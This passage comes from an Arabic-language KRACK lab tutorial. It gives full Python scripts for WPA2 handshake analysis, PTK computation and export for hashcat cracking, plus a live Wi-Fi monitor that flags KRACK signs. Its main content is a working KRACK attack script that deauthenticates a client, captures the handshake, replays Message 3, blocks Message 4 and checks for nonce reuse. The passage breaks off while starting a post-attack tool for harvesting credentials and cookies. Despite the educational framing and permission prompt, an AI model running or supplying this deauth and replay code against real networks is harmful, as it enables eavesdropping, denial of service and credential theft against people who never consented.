        print(f"║  Client MAC Address:    {self.client_mac or 'N/A':<40} ║")
        
        if self.anonce:
            anonce_short = binascii.hexlify(self.anonce).decode()[:40]
            print(f"║  ANonce:                {anonce_short}... ║")
        
        if self.snonce:
            snonce_short = binascii.hexlify(self.snonce).decode()[:40]
            print(f"║  SNonce:                {snonce_short}... ║")
        
        print("╠" + "═" * 68 + "╣")
        
        if self.anonce and self.snonce:
            print("║  ✓ Complete handshake with both nonces captured              ║")
            print("║  → PTK can be computed (if PSK/PMK is known)                 ║")
        else:
            print("║  ✗ Incomplete nonce data                                     ║")
        
        print("╚" + "═" * 68 + "╝")
    
    def compute_ptk(self, pmk, ap_mac, client_mac, anonce, snonce):
        """
        حساب PTK (Pairwise Transient Key)
        
        PTK = PRF-512(PMK, "Pairwise key expansion",
                      Min(AP_MAC, Client_MAC) || Max(AP_MAC, Client_MAC) ||
                      Min(ANonce, SNonce) || Max(ANonce, SNonce))
        """
        
        print("\n[*] Computing PTK...")
        
        # تحويل MAC addresses من string إلى bytes
        ap_mac_bytes = binascii.unhexlify(ap_mac.replace(':', ''))
        client_mac_bytes = binascii.unhexlify(client_mac.replace(':', ''))
        
        # ترتيب MAC addresses
        if ap_mac_bytes < client_mac_bytes:
            mac_data = ap_mac_bytes + client_mac_bytes
        else:
            mac_data = client_mac_bytes + ap_mac_bytes
        
        # ترتيب Nonces
        if anonce < snonce:
            nonce_data = anonce + snonce
        else:
            nonce_data = snonce + anonce
        
        # إنشاء البيانات للـ PRF
        prf_data = b"Pairwise key expansion\x00" + mac_data + nonce_data
        
        # حساب PTK باستخدام PRF-512
        ptk = self.prf_512(pmk, prf_data)
        
        # تقسيم PTK
        kck = ptk[0:16]   # Key Confirmation Key
        kek = ptk[16:32]  # Key Encryption Key
        tk = ptk[32:48]   # Temporal Key
        
        print(f"[✓] PTK computed ({len(ptk)} bytes)")
        print(f"    KCK: {binascii.hexlify(kck).decode()}")
        print(f"    KEK: {binascii.hexlify(kek).decode()}")
        print(f"    TK:  {binascii.hexlify(tk).decode()}")
        
        return {'ptk': ptk, 'kck': kck, 'kek': kek, 'tk': tk}
    
    def prf_512(self, key, data):
        """
        Pseudo-Random Function لحساب 512 بت
        """
        result = b''
        for i in range(4):  # 4 iterations × 160 bits = 640 bits (نأخذ أول 512)
            hmac_data = data + bytes([i])
            hmac_obj = HMAC.new(key, hmac_data, SHA1)
            result += hmac_obj.digest()
        
        return result[:64]  # 512 bits = 64 bytes
    
    def verify_mic(self, pmk, eapol_frame):
        """
        التحقق من MIC في إطار EAPOL
        """
        
        if not self.anonce or not self.snonce:
            print("[-] Cannot verify MIC: missing nonces")
            return False
        
        # حساب PTK
        ptk_data = self.compute_ptk(
            pmk, 
            self.ap_mac, 
            self.client_mac, 
            self.anonce, 
            self.snonce
        )
        
        kck = ptk_data['kck']
        
        # استخراج EAPOL frame بدون MIC
        eapol_bytes = bytes(eapol_frame[EAPOL])
        eapol_no_mic = eapol_bytes[:81] + b'\x00' * 16 + eapol_bytes[97:]
        
        # حساب MIC
        calculated_mic = HMAC.new(kck, eapol_no_mic, SHA1).digest()[:16]
        
        # المقارنة
        original_mic = eapol_bytes[81:97]
        
        print(f"\n[*] MIC Verification:")
        print(f"    Original MIC:    {binascii.hexlify(original_mic).decode()}")
        print(f"    Calculated MIC:  {binascii.hexlify(calculated_mic).decode()}")
        
        if calculated_mic == original_mic:
            print(f"    [✓] MIC is VALID!")
            return True
        else:
            print(f"    [✗] MIC is INVALID!")
            return False
    
    def detect_retransmissions(self):
        """كشف إعادة إرسال الرسائل (علامة محتملة لـ KRACK)"""
        
        print("\n[*] Checking for message retransmissions...")
        
        msg_counts = {1: 0, 2: 0, 3: 0, 4: 0}
        msg3_replay_counters = []
        
        for pkt in self.eapol_frames:
            frame_info = self.parse_eapol_key_frame(pkt)
            if not frame_info:
                continue
            
            msg_num = self.identify_message_number(frame_info)
            if msg_num > 0:
                msg_counts[msg_num] += 1
                
                if msg_num == 3:
                    msg3_replay_counters.append(frame_info['replay_counter'])
        
        print(f"\n  Message Distribution:")
        for msg_num, count in msg_counts.items():
            status = "⚠" if count > 1 else "✓"
            print(f"    {status} Message {msg_num}: {count} occurrence(s)")
        
        # تحليل Message 3 بالتحديد
        if msg_counts[3] > 1:
            print(f"\n  [!] Multiple Message 3 detected!")
            print(f"      This is a KRACK attack indicator!")
            print(f"\n  Replay Counters for Message 3:")
            for i, rc in enumerate(msg3_replay_counters, 1):
                print(f"    #{i}: {rc}")
            
            if len(set(msg3_replay_counters)) < len(msg3_replay_counters):
                print(f"\n  [✓✓] DUPLICATE REPLAY COUNTERS!")
                print(f"      Definite KRACK attack signature!")
        else:
            print(f"\n  [✓] Normal handshake pattern - no retransmissions")
    
    def export_data_for_cracking(self, output_file):
        """تصدير البيانات بصيغة hashcat/aircrack-ng"""
        
        if not self.anonce or not self.snonce or not self.mic:
            print("[-] Cannot export: missing required data")
            return
        
        # تنسيق hashcat (EAPOL)
        essid = "KRACK-Lab-AP"  # يجب استخراجه من Beacon frames
        
        hashcat_format = (
            f"WPA*02*"
            f"{binascii.hexlify(self.mic).decode()}*"
            f"{self.ap_mac.replace(':', '')}*"
            f"{self.client_mac.replace(':', '')}*"
            f"{binascii.hexlify(essid.encode()).decode()}*"
            f"{binascii.hexlify(self.anonce).decode()}*"
            # ... المزيد من البيانات
        )
        
        with open(output_file, 'w') as f:
            f.write(hashcat_format)
        
        print(f"[✓] Handshake data exported to: {output_file}")
        print(f"    Use with: hashcat -m 22000 {output_file} wordlist.txt")

def main():
    """الدالة الرئيسية"""
    
    import sys
    
    if len(sys.argv) < 2:
        print("Usage: python3 advanced_handshake_analyzer.py <pcap_file> [pmk_hex]")
        print("\nExamples:")
        print("  # تحليل أساسي")
        print("  python3 advanced_handshake_analyzer.py handshake.cap")
        print("\n  # تحليل مع التحقق من MIC")
        print("  python3 advanced_handshake_analyzer.py handshake.cap <PMK_in_hex>")
        sys.exit(1)
    
    pcap_file = sys.argv[1]
    
    # إنشاء المحلل
    analyzer = WPA2HandshakeAnalyzer(pcap_file)
    
    # تحليل المصافحة
    analyzer.analyze_full_handshake()
    
    # كشف إعادة الإرسال
    analyzer.detect_retransmissions()
    
    # إذا تم توفير PMK، التحقق من MIC
    if len(sys.argv) == 3:
        try:
            pmk = binascii.unhexlify(sys.argv[2])
            if len(pmk) == 32:  # PMK يجب أن يكون 256 بت
                analyzer.verify_mic(pmk, analyzer.handshake_packets[1])
            else:
                print("[-] Invalid PMK length (must be 32 bytes / 64 hex chars)")
        except Exception as e:
            print(f"[-] Error processing PMK: {e}")
    
    # تصدير البيانات
    analyzer.export_data_for_cracking("handshake.hccapx")

if __name__ == "__main__":
    main()
```

**استخدام المحلل المتقدم:**

```bash
# تحليل أساسي
python3 advanced_handshake_analyzer.py capture.cap

# مع PMK معروف للتحقق
python3 advanced_handshake_analyzer.py capture.cap 0123456789abcdef...
```

---

## التمرين 4: بناء سكريبت استماع متقدم {#تمرين-4-سكريبت-الاستماع}

### الهدف
إنشاء أداة مخصصة لمراقبة الشبكات اللاسلكية وكشف أنماط KRACK في الوقت الفعلي.

### 4.1 مراقب الشبكة في الوقت الفعلي

```python
#!/usr/bin/env python3
"""
realtime_wifi_monitor.py - مراقب شبكات لاسلكية في الوقت الفعلي
"""

from scapy.all import *
from collections import defaultdict
from datetime import datetime
import threading
import time
import sys

class WiFiMonitor:
    """مراقب شامل للشبكات اللاسلكية"""
    
    def __init__(self, interface):
        self.interface = interface
        self.networks = {}  # BSSID -> network_info
        self.clients = defaultdict(dict)  # BSSID -> {client_mac -> info}
        self.handshakes = defaultdict(list)  # BSSID -> [handshake_packets]
        self.krack_suspects = set()  # BSSIDs مشبوهة
        self.packet_count = 0
        self.start_time = time.time()
        self.running = True
        
        # إحصائيات
        self.stats = {
            'total_packets': 0,
            'beacon_frames': 0,
            'data_frames': 0,
            'eapol_frames': 0,
            'deauth_frames': 0,
            'handshakes_captured': 0,
            'krack_attempts_detected': 0,
        }
    
    def packet_handler(self, pkt):
        """معالج الحزم الرئيسي"""
        
        self.stats['total_packets'] += 1
        
        try:
            # Beacon Frames - اكتشاف الشبكات
            if pkt.haslayer(Dot11Beacon):
                self.handle_beacon(pkt)
            
            # Probe Requests - اكتشاف العملاء
            elif pkt.haslayer(Dot11ProbeReq):
                self.handle_probe_request(pkt)
            
            # Data Frames
            elif pkt.haslayer(Dot11WEP):
                self.handle_data_frame(pkt)
            
            # EAPOL Frames - المصافحات
            elif pkt.haslayer(EAPOL):
                self.handle_eapol(pkt)
            
            # Deauthentication - هجمات محتملة
            elif pkt.haslayer(Dot11Deauth):
                self.handle_deauth(pkt)
        
        except Exception as e:
            pass  # تجاهل الأخطاء لعدم إيقاف المراقبة
    
    def handle_beacon(self, pkt):
        """معالجة Beacon frames"""
        
        self.stats['beacon_frames'] += 1
        
        bssid = pkt.addr2
        
        # استخراج معلومات الشبكة
        try:
            ssid = pkt[Dot11Elt].info.decode('utf-8', errors='ignore')
            channel = int(ord(pkt[Dot11Elt:3].info))
            
            # معلومات التشفير
            crypto = set()
            if pkt.haslayer(Dot11Elt):
                p = pkt[Dot11Elt]
                while isinstance(p, Dot11Elt):
                    if p.ID == 48:  # RSN Information
                        crypto.add("WPA2")
                    elif p.ID == 221 and p.info.startswith(b'\x00P\xf2\x01\x01\x00'):
                        crypto.add("WPA")
                    p = p.payload
            
            if not crypto:
                crypto.add("OPN")
            
            # تحديث معلومات الشبكة
            if bssid not in self.networks:
                self.networks[bssid] = {
                    'ssid': ssid,
                    'channel': channel,
                    'encryption': crypto,
                    'first_seen': datetime.now(),
                    'last_seen': datetime.now(),
                    'beacon_count': 1,
                    'signal_strength': pkt.dBm_AntSignal if hasattr(pkt, 'dBm_AntSignal') else -100,
                }
            else:
                self.networks[bssid]['last_seen'] = datetime.now()
                self.networks[bssid]['beacon_count'] += 1
        
        except:
            pass
    
    def handle_probe_request(self, pkt):
        """معالجة Probe Request frames"""
        
        client_mac = pkt.addr2
        
        try:
            ssid = pkt[Dot11Elt].info.decode('utf-8', errors='ignore')
            
            # تسجيل العميل
            if client_mac not in self.clients['probing']:
                self.clients['probing'][client_mac] = {
                    'ssids': [ssid] if ssid else [],
                    'first_seen': datetime.now(),
                }
            else:
                if ssid and ssid not in self.clients['probing'][client_mac]['ssids']:
                    self.clients['probing'][client_mac]['ssids'].append(ssid)
        
        except:
            pass
    
    def handle_data_frame(self, pkt):
        """معالجة Data frames"""
        
        self.stats['data_frames'] += 1
        
        # تسجيل الاتصال بين AP والعميل
        if pkt.addr1 and pkt.addr2:
            bssid = pkt.addr1 if pkt.FCfield & 0x1 else pkt.addr2
            client = pkt.addr2 if pkt.FCfield & 0x1 else pkt.addr1
            
            if bssid in self.networks:
                if client not in self.clients[bssid]:
                    self.clients[bssid][client] = {
                        'first_seen': datetime.now(),
                        'packets_sent': 0,
                        'packets_received': 0,
                    }
                
                # تحديث العدادات
                if pkt.FCfield & 0x1:  # To DS
                    self.clients[bssid][client]['packets_sent'] += 1
                else:  # From DS
                    self.clients[bssid][client]['packets_received'] += 1
    
    def handle_eapol(self, pkt):
        """معالجة EAPOL frames - الأهم لكشف KRACK"""
        
        self.stats['eapol_frames'] += 1
        
        try:
            # تحديد الاتجاه
            bssid = pkt.addr1 if pkt.FCfield & 0x1 else pkt.addr2
            client = pkt.addr2 if pkt.FCfield & 0x1 else pkt.addr1
            
            # استخراج معلومات EAPOL
            eapol = pkt[EAPOL]
            raw_eapol = bytes(eapol)
            
            key_info = struct.unpack('>H', raw_eapol[5:7])[0]
            replay_counter = struct.unpack('>Q', raw_eapol[9:17])[0]
            
            # تحديد نوع الرسالة
            msg_type = self.identify_eapol_message(key_info)
            
            # تسجيل الحزمة
            handshake_key = f"{bssid}-{client}"
            self.handshakes[handshake_key].append({
                'packet': pkt,
                'timestamp': datetime.now(),
                'message_type': msg_type,
                'replay_counter': replay_counter,
                'key_info': key_info,
            })
            
            # كشف KRACK - البحث عن تكرار Message 3
            if msg_type == 3:
                msg3_list = [h for h in self.handshakes[handshake_key] if h['message_type'] == 3]
                
                if len(msg3_list) > 1:
                    # تحقق من Replay Counters
                    replay_counters = [h['replay_counter'] for h in msg3_list]
                    
                    if len(replay_counters) != len(set(replay_counters)):
                        # يوجد تكرار في Replay Counter!
                        self.krack_suspects.add(bssid)
                        self.stats['krack_attempts_detected'] += 1
                        
                        print(f"\n{'!' * 70}")
                        print(f"  [ALERT] Possible KRACK Attack Detected!")
                        print(f"{'!' * 70}")
                        print(f"  Target AP: {bssid}")
                        print(f"  Target Client: {client}")
                        print(f"  Message 3 Retransmissions: {len(msg3_list)}")
                        print(f"  Duplicate Replay Counters: YES")
                        print(f"  Timestamp: {datetime.now()}")
                        print(f"{'!' * 70}\n")
            
            # التحقق من handshake كاملة
            if len(self.handshakes[handshake_key]) >= 4:
                msg_types = [h['message_type'] for h in self.handshakes[handshake_key][-4:]]
                if msg_types == [1, 2, 3, 4]:
                    self.stats['handshakes_captured'] += 1
                    print(f"[+] Complete handshake captured: {bssid} <-> {client}")
        
        except Exception as e:
            pass
    
    def identify_eapol_message(self, key_info):
        """تحديد نوع رسالة EAPOL"""
        
        install = bool(key_info & 0x0040)
        ack = bool(key_info & 0x0080)
        mic = bool(key_info & 0x0100)
        secure = bool(key_info & 0x0200)
        
        if ack and not mic and not install:
            return 1
        elif not ack and mic and not install:
            return 2
        elif ack and mic and install and secure:
            return 3
        elif not ack and mic and secure and not install:
            return 4
        else:
            return 0
    
    def handle_deauth(self, pkt):
        """معالجة Deauthentication frames"""
        
        self.stats['deauth_frames'] += 1
        
        # كشف Deauth floods (هجوم DoS محتمل)
        # يمكن تطويره أكثر

    def print_status(self):
        """طباعة حالة المراقبة الحالية"""
        
        while self.running:
            time.sleep(5)  # تحديث كل 5 ثواني
            
            # مسح الشاشة
            os.system('clear' if os.name == 'posix' else 'cls')
            
            # العنوان
            print("╔" + "═" * 78 + "╗")
            print("║" + " " * 25 + "WiFi Monitor - Live Status" + " " * 26 + "║")
            print("╚" + "═" * 78 + "╝")
            
            # الوقت والإحصائيات
            runtime = int(time.time() - self.start_time)
            print(f"\n  Runtime: {runtime}s | Interface: {self.interface}")
            print(f"  Packets Processed: {self.stats['total_packets']}")
            print(f"  Handshakes Captured: {self.stats['handshakes_captured']}")
            print(f"  KRACK Attempts Detected: {self.stats['krack_attempts_detected']}")
            
            # الشبكات المكتشفة
            print("\n┌─" + "─" * 76 + "┐")
            print("│ Detected Networks" + " " * 59 + "│")
            print("├─" + "─" * 76 + "┤")
            print("│ {:17} | {:20} | {:4} | {:10} | {:6} │".format(
                "BSSID", "SSID", "CH", "Encryption", "Beacons"
            ))
            print("├─" + "─" * 76 + "┤")
            
            for bssid, info in sorted(self.networks.items(), 
                                     key=lambda x: x[1]['beacon_count'], 
                                     reverse=True)[:10]:  # أعلى 10
                ssid = info['ssid'][:20] if info['ssid'] else "<Hidden>"
                channel = info['channel']
                crypto = ','.join(info['encryption'])[:10]
                beacons = info['beacon_count']
                
                # تمييز الشبكات المشبوهة
                marker = "⚠" if bssid in self.krack_suspects else " "
                
                print(f"│{marker}{bssid:17} | {ssid:20} | {channel:4} | {crypto:10} | {beacons:6} │")
            
            print("└─" + "─" * 76 + "┘")
            
            # العملاء المتصلين
            total_clients = sum(len(clients) for clients in self.clients.values())
            print(f"\n  Total Active Clients: {total_clients}")
            
            # تفاصيل الشبكات المشبوهة
            if self.krack_suspects:
                print("\n┌─" + "─" * 76 + "┐")
                print("│ ⚠  SUSPICIOUS NETWORKS (Possible KRACK Activity)" + " " * 27 + "│")
                print("├─" + "─" * 76 + "┤")
                
                for bssid in self.krack_suspects:
                    if bssid in self.networks:
                        info = self.networks[bssid]
                        print(f"│  • {bssid} - {info['ssid'][:30]:<30}" + " " * 20 + "│")
                
                print("└─" + "─" * 76 + "┘")
            
            # الإحصائيات التفصيلية
            print("\n┌─" + "─" * 76 + "┐")
            print("│ Packet Statistics" + " " * 59 + "│")
            print("├─" + "─" * 76 + "┤")
            for stat_name, stat_value in self.stats.items():
                if stat_name != 'total_packets':
                    print(f"│  {stat_name.replace('_', ' ').title():30}: {stat_value:>6}" + " " * 38 + "│")
            print("└─" + "─" * 76 + "┘")
            
            print("\nPress Ctrl+C to stop monitoring and save results...")
    
    def save_results(self, filename="wifi_monitor_results.json"):
        """حفظ النتائج في ملف"""
        
        import json
        
        results = {
            'scan_time': datetime.now().isoformat(),
            'runtime_seconds': int(time.time() - self.start_time),
            'statistics': self.stats,
            'networks': {
                bssid: {
                    'ssid': info['ssid'],
                    'channel': info['channel'],
                    'encryption': list(info['encryption']),
                    'beacon_count': info['beacon_count'],
                    'first_seen': info['first_seen'].isoformat(),
                    'last_seen': info['last_seen'].isoformat(),
                }
                for bssid, info in self.networks.items()
            },
            'suspicious_networks': list(self.krack_suspects),
            'handshakes': {
                key: len(packets)
                for key, packets in self.handshakes.items()
            }
        }
        
        with open(filename, 'w') as f:
            json.dump(results, f, indent=2)
        
        print(f"\n[✓] Results saved to: {filename}")
    
    def start_monitoring(self):
        """بدء المراقبة"""
        
        print(f"[*] Starting WiFi monitor on {self.interface}...")
        print(f"[*] Press Ctrl+C to stop\n")
        
        # بدء thread للواجهة
        status_thread = threading.Thread(target=self.print_status)
        status_thread.daemon = True
        status_thread.start()
        
        try:
            # بدء الاستماع
            sniff(
                iface=self.interface,
                prn=self.packet_handler,
                store=0,  # لا تخزن الحزم في الذاكرة
                stop_filter=lambda x: not self.running
            )
        
        except KeyboardInterrupt:
            print("\n\n[*] Stopping monitor...")
            self.running = False
            
            # حفظ النتائج
            self.save_results()
            
            # ملخص نهائي
            print("\n" + "═" * 80)
            print("  MONITORING SUMMARY")
            print("═" * 80)
            print(f"  Total Runtime: {int(time.time() - self.start_time)}s")
            print(f"  Total Packets: {self.stats['total_packets']}")
            print(f"  Networks Discovered: {len(self.networks)}")
            print(f"  Handshakes Captured: {self.stats['handshakes_captured']}")
            print(f"  KRACK Attempts Detected: {self.stats['krack_attempts_detected']}")
            print("═" * 80)

def main():
    """الدالة الرئيسية"""
    
    if len(sys.argv) != 2:
        print("Usage: sudo python3 realtime_wifi_monitor.py <interface>")
        print("Example: sudo python3 realtime_wifi_monitor.py wlan0mon")
        sys.exit(1)
    
    interface = sys.argv[1]
    
    # التحقق من صلاحيات root
    if os.geteuid() != 0:
        print("[-] This script requires root privileges!")
        sys.exit(1)
    
    # التحقق من وضع المراقبة
    try:
        result = subprocess.check_output(['iwconfig', interface], 
                                        stderr=subprocess.DEVNULL).decode()
        if 'Mode:Monitor' not in result:
            print(f"[-] {interface} is not in monitor mode!")
            print(f"[*] Run: sudo airmon-ng start {interface.replace('mon', '')}")
            sys.exit(1)
    except:
        print(f"[-] Interface {interface} not found!")
        sys.exit(1)
    
    # إنشاء وبدء المراقب
    monitor = WiFiMonitor(interface)
    monitor.start_monitoring()

if __name__ == "__main__":
    main()
```

**استخدام المراقب:**

```bash
# تفعيل وضع المراقبة
sudo airmon-ng start wlan0

# تشغيل المراقب
sudo python3 realtime_wifi_monitor.py wlan0mon
```

---

## التمرين 5: محاكاة هجوم KRACK المحكوم {#تمرين-5-محاكاة-krack}

### الهدف
تنفيذ هجوم KRACK كامل في بيئة مختبرية محكومة لفهم آلية الهجوم بشكل عملي.

### 5.1 السكريبت الكامل لهجوم KRACK

```python
#!/usr/bin/env python3
"""
krack_attack_simulator.py - محاكي هجوم KRACK للأغراض التعليمية
⚠️ استخدام هذا السكريبت على شبكات الغير غير قانوني!
"""

from scapy.all import *
import time
import sys
import os
import threading
from collections import defaultdict

class KRACKAttacker:
    """فئة لتنفيذ هجوم KRACK"""
    
    def __init__(self, interface, target_ap, target_client, channel):
        self.interface = interface
        self.target_ap = target_ap
        self.target_client = target_client
        self.channel = channel
        
        # حالة الهجوم
        self.handshake_captured = False
        self.msg1_packet = None
        self.msg2_packet = None
        self.msg3_packet = None
        self.msg4_packet = None
        self.attack_successful = False
        
        # إحصائيات
        self.stats = {
            'deauth_sent': 0,
            'msg3_replays': 0,
            'msg4_blocked': 0,
            'nonce_reuse_detected': 0,
        }
        
        # تتبع Nonces
        self.observed_nonces = set()
        
    def hop_to_channel(self):
        """التبديل إلى قناة الهدف"""
        os.system(f"iwconfig {self.interface} channel {self.channel}")
        print(f"[*] Hopped to channel {self.channel}")
    
    def deauth_target(self, count=5):
        """إرسال حزم Deauthentication"""
        
        print(f"[*] Sending {count} deauth packets to force reconnection...")
        
        # إنشاء حزمة Deauth
        dot11 = Dot11(addr1=self.target_client, 
                     addr2=self.target_ap, 
                     addr3=self.target_ap)
        deauth = RadioTap()/dot11/Dot11Deauth(reason=7)
        
        # إرسال
        for i in range(count):
            sendp(deauth, iface=self.interface, verbose=False)
            self.stats['deauth_sent'] += 1
            time.sleep(0.1)
        
        print(f"[+] Deauth attack completed ({count} packets)")
    
    def capture_handshake(self, timeout=30):
        """التقاط المصافحة الرباعية"""
        
        print(f"[*] Waiting for 4-way handshake (timeout: {timeout}s)...")
        
        start_time = time.time()
        packets_captured = {'count': 0}
        
        def packet_handler(pkt):
            if time.time() - start_time > timeout:
                return True  # إيقاف
            
            if pkt.haslayer(EAPOL):
                # التحقق من أن الحزمة من/إلى الهدف
                if (pkt.addr1 == self.target_client or 
                    pkt.addr2 == self.target_client):
                    
                    # تحليل نوع الرسالة
                    try:
                        eapol = pkt[EAPOL]
                        raw = bytes(eapol)
                        key_info = struct.unpack('>H', raw[5:7])[0]
                        
                        msg_type = self._identify_message(key_info)
                        
                        if msg_type == 1:
                            self.msg1_packet = pkt
                            print("[+] Captured Message 1")
                        elif msg_type == 2:
                            self.msg2_packet = pkt
                            print("[+] Captured Message 2")
                        elif msg_type == 3:
                            self.msg3_packet = pkt
                            print("[+] Captured Message 3")
                        elif msg_type == 4:
                            self.msg4_packet = pkt
                            print("[+] Captured Message 4")
                        
                        packets_captured['count'] += 1
                        
                        # إذا اكتملت المصافحة
                        if all([self.msg1_packet, self.msg2_packet, 
                               self.msg3_packet, self.msg4_packet]):
                            self.handshake_captured = True
                            return True  # إيقاف
                    
                    except:
                        pass
            
            return False
        
        # بدء الاستماع
        sniff(iface=self.interface, 
              prn=packet_handler,
              stop_filter=packet_handler,
              timeout=timeout)
        
        if self.handshake_captured:
            print("[✓] Complete handshake captured!")
            return True
        else:
            print(f"[-] Handshake capture failed (got {packets_captured['count']}/4 messages)")
            return False
    
    def _identify_message(self, key_info):
        """تحديد نوع رسالة EAPOL"""
        install = bool(key_info & 0x0040)
        ack = bool(key_info & 0x0080)
        mic = bool(key_info & 0x0100)
        secure = bool(key_info & 0x0200)
        
        if ack and not mic:
            return 1
        elif not ack and mic and not install:
            return 2
        elif ack and mic and install and secure:
            return 3
        elif not ack and mic and secure:
            return 4
        return 0
    
    def block_message_4(self):
        """حجب الرسالة 4"""
        
        print("[*] Blocking Message 4 from reaching AP...")
        
        blocked = {'count': 0}
        
        def block_handler(pkt):
            if pkt.haslayer(EAPOL) and pkt.addr2 == self.target_client:
                try:
                    eapol = pkt[EAPOL]
                    raw = bytes(eapol)
                    key_info = struct.unpack('>H', raw[5:7])[0]
                    
                    if self._identify_message(key_info) == 4:
                        blocked['count'] += 1
                        self.stats['msg4_blocked'] += 1
                        print(f"[!] Blocked Message 4 (#{blocked['count']})")
                        
                        if blocked['count'] >= 3:
                            return True  # يكفي
                except:
                    pass
            
            return False
        
        # استماع وحجب
        sniff(iface=self.interface,
              stop_filter=block_handler,
              timeout=10)
    
    def replay_message_3(self, count=5):
        """إعادة إرسال الرسالة 3"""
        
        if not self.msg3_packet:
            print("[-] No Message 3 to replay!")
            return False
        
        print(f"[*] Replaying Message 3 ({count} times)...")
        
        for i in range(count):
            # إرسال الحزمة
            sendp(self.msg3_packet, iface=self.interface, verbose=False)
            self.stats['msg3_replays'] += 1
            
            print(f"[+] Replay #{i+1} sent")
            time.sleep(1)
            
            # حجب Message 4 المحتمل
            threading.Thread(target=self.block_message_4, daemon=True).start()
            time.sleep(0.5)
        
        print("[✓] Message 3 replay completed")
        return True
    
    def monitor_nonce_reuse(self, duration=30):
        """مراقبة إعادة استخدام Nonce"""
        
        print(f"[*] Monitoring for nonce reuse ({duration}s)...")
        
        start_time = time.time()
        
        def nonce_handler(pkt):
            if time.time() - start_time > duration:
                return True
            
            if pkt.haslayer(Dot11WEP) and pkt.addr2 == self.target_client:
                try:
                    # استخراج CCMP PN (Packet Number)
                    wep = pkt[Dot11WEP]
                    pn = bytes([wep.iv[0], wep.iv[1], wep.iv[2], 
                               wep.keyid, wep.iv[3], wep.iv[4]])
                    
                    # التحقق من إعادة الاستخدام
                    if pn in self.observed_nonces:
                        print("\n" + "!" * 70)
                        print("  [✓✓✓] NONCE REUSE DETECTED!")
                        print("  [✓] KRACK Attack SUCCESSFUL!")
                        print("!" * 70 + "\n")
                        
                        self.stats['nonce_reuse_detected'] += 1
                        self.attack_successful = True
                        return True
                    
                    self.observed_nonces.add(pn)
                
                except:
                    pass
            
            return False
        
        sniff(iface=self.interface,
              prn=nonce_handler,
              stop_filter=nonce_handler,
              timeout=duration)
        
        if not self.attack_successful:
            print("[-] No nonce reuse detected - attack may have failed")
        
        return self.attack_successful
    
    def run_full_attack(self):
        """تنفيذ الهجوم الكامل"""
        
        print("\n" + "═" * 70)
        print("  KRACK Attack Simulator - EDUCATIONAL PURPOSE ONLY")
        print("═" * 70)
        print(f"  Target AP: {self.target_ap}")
        print(f"  Target Client: {self.target_client}")
        print(f"  Channel: {self.channel}")
        print(f"  Interface: {self.interface}")
        print("═" * 70 + "\n")
        
        # المرحلة 1: التحضير
        print("[Phase 1] Preparation")
        print("─" * 70)
        self.hop_to_channel()
        time.sleep(1)
        
        # المرحلة 2: فصل العميل
        print("\n[Phase 2] Deauthentication")
        print("─" * 70)
        self.deauth_target(count=10)
        time.sleep(2)
        
        # المرحلة 3: التقاط المصافحة
        print("\n[Phase 3] Handshake Capture")
        print("─" * 70)
        if not self.capture_handshake(timeout=60):
            print("\n[-] Attack failed: could not capture handshake")
            return False
        
        time.sleep(2)
        
        # المرحلة 4: إعادة إرسال Message 3
        print("\n[Phase 4] Message 3 Replay Attack")
        print("─" * 70)
        if not self.replay_message_3(count=5):
            print("\n[-] Attack failed: could not replay Message 3")
            return False
        
        time.sleep(2)
        
        # المرحلة 5: كشف إعادة استخدام Nonce
        print("\n[Phase 5] Nonce Reuse Detection")
        print("─" * 70)
        self.monitor_nonce_reuse(duration=30)
        
        # النتائج
        self.print_results()
        
        return self.attack_successful
    
    def print_results(self):
        """طباعة نتائج الهجوم"""
        
        print("\n" + "═" * 70)
        print("  ATTACK RESULTS")
        print("═" * 70)
        
        print(f"  Status: {'SUCCESS ✓' if self.attack_successful else 'FAILED ✗'}")
        print(f"\n  Statistics:")
        print(f"    • Deauth packets sent: {self.stats['deauth_sent']}")
        print(f"    • Message 3 replays: {self.stats['msg3_replays']}")
        print(f"    • Message 4 blocked: {self.stats['msg4_blocked']}")
        print(f"    • Nonce reuses detected: {self.stats['nonce_reuse_detected']}")
        
        if self.attack_successful:
            print(f"\n  [✓] Target is VULNERABLE to KRACK!")
            print(f"  [✓] Client reinstalled encryption key")
            print(f"  [✓] Traffic can potentially be decrypted")
        else:
            print(f"\n  [*] Target appears to be PATCHED or attack failed")
            print(f"  [*] No key reinstallation detected")
        
        print("═" * 70)

def main():
    """الدالة الرئيسية"""
    
    if len(sys.argv) != 5:
        print("Usage: sudo python3 krack_attack_simulator.py <interface> <AP_MAC> <Client_MAC> <channel>")
        print("\nExample:")
        print("  sudo python3 krack_attack_simulator.py wlan0mon AA:BB:CC:DD:EE:FF 11:22:33:44:55:66 6")
        sys.exit(1)
    
    interface = sys.argv[1]
    ap_mac = sys.argv[2]
    client_mac = sys.argv[3]
    channel = int(sys.argv[4])
    
    # التحقق من الصلاحيات
    if os.geteuid() != 0:
        print("[-] This script requires root privileges!")
        sys.exit(1)
    
    # تحذير أخلاقي
    print("\n" + "⚠" * 35)
    print("  WARNING: EDUCATIONAL PURPOSE ONLY")
    print("  Attacking networks without permission is ILLEGAL!")
    print("⚠" * 35 + "\n")
    
    response = input("Do you have explicit permission to test this network? (yes/no): ")
    if response.lower() != "yes":
        print("[-] Attack aborted")
        sys.exit(0)
    
    # إنشاء المهاجم وتنفيذ الهجوم
    attacker = KRACKAttacker(interface, ap_mac, client_mac, channel)
    attacker.run_full_attack()

if __name__ == "__main__":
    main()
```

**استخدام السكريبت:**

```bash
# تفعيل Monitor Mode
sudo airmon-ng start wlan0

# تشغيل الهجوم
sudo python3 krack_attack_simulator.py wlan0mon AA:BB:CC:DD:EE:FF 11:22:33:44:55:66 6
```

---

## التمرين 6: تحليل حركة المرور بعد الهجوم {#تمرين-6-تحليل-البيانات}

### الهدف
التقاط وتحليل البيانات المفككة التشفير بعد هجوم KRACK الناجح.

### 6.1 سكريبت التقاط وتحليل البيانات

```python
#!/usr/bin/env python3
"""
post_krack_analyzer.py - تحليل البيانات بعد هجوم KRACK
"""

from scapy.all import *
import re
from collections import defaultdict

class PostKRACKAnalyzer:
    """محلل البيانات بعد هجوم KRACK"""
    
    def __init__(self, pcap_file):
        self.pcap_file = pcap_file
        self.packets = rdpcap(pcap_file)
        
        # البيانات المستخرجة
        self.http_requests = []
        self.dns_queries = []
        self.credentials = []
        self.cookies = []
        self.plaintext_data = []
        
    def analyze_all(self):
        """تحليل شامل للبيانات"""
        
        print("[*] Analyzing captured traffic...")
        
        for pkt in self.packets:
            # تحليل HTTP
            if pkt.haslayer(TCP) and pkt.haslayer(Raw):
                self.analyze_http(pkt)
            
            # تحليل DNS
            if pkt.haslayer(DNS):
